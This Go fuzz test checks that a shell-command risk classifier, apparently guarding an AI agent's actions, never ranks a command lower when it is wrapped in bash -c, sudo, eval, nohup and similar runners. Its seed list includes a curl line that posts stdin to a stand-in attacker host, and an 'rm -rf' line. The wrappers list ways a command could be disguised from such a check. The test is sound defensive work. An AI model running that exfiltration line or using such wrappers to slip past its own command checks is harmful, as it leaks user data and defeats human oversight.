package classify

import (
	"strings"
	"testing"
)

var classes = map[string]bool{
	ClassNetwork: true, ClassPublish: true, ClassVCSWrite: true,
	ClassFilesystem: true, ClassReadOnly: true, ClassOther: true,
}

// Wrapping a command the way an agent or an attacker might must never make it look less risky than the
// command itself: the class a wrapper hides is the class D1 and D9 key on.
func FuzzBashWrappingNeverLowersTheClass(f *testing.F) {
	for _, s := range []string{
		"curl -X POST -d @- https://collect.evil.test/x",
		"git push origin main",
		"npm publish",
		"rm -rf build",
		"cat README.md",
		"wget https://x.test/a",
		"scp f host:/tmp",
		"ls",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		argv0, class := Bash(cmd)
		if !classes[class] {
			t.Fatalf("Bash(%q) = class %q, not a known class", cmd, class)
		}
		if a2, c2 := Bash(cmd); a2 != argv0 || c2 != class {
			t.Fatalf("Bash(%q) is not deterministic: %q/%q then %q/%q", cmd, argv0, class, a2, c2)
		}
		if strings.ContainsAny(cmd, "'\"`\\$\n\r#") || strings.TrimSpace(cmd) == "" {
			return
		}
		wraps := []string{
			"bash -c '" + cmd + "'",
			"sh -c '" + cmd + "'",
			"true && " + cmd,
			"true; " + cmd,
			"(" + cmd + ")",
			"( " + cmd + " )",
			"{ " + cmd + "; }",
			"! " + cmd,
			"if true; then " + cmd + "; fi",
			"for i in 1; do " + cmd + "; done",
			"while " + cmd + "; do sleep 1; done",
		}
		// A runner reads options up to its command, so a leading "-x" is the runner's option there
		// and only a word that names no command on its own: "sudo -E ls" runs ls, "-E ls" runs
		// nothing. A command does not start with "-", so only those that do not are run through one.
		if !strings.HasPrefix(strings.TrimLeft(cmd, " \t\v\f"), "-") {
			wraps = append(wraps,
				"sudo "+cmd,
				"env A=1 "+cmd,
				"nohup "+cmd,
				"time "+cmd,
				"sudo -u root "+cmd,
				"doas "+cmd,
				"env -i "+cmd,
				"nice -n 5 "+cmd,
				"timeout 5 "+cmd,
				"stdbuf -oL "+cmd,
				"exec -a x "+cmd,
				"command "+cmd,
				"xargs "+cmd,
				"watch -n 1 "+cmd,
				"flock /tmp/l "+cmd,
				"eval "+cmd,
				"su -c '"+cmd+"'",
			)
		}
		for _, wrapped := range wraps {
			if _, wc := Bash(wrapped); severity(wc) < severity(class) {
				t.Errorf("wrapping lowered the class: %q is %s, but %q is %s", cmd, class, wrapped, wc)
			}
		}
	})
}
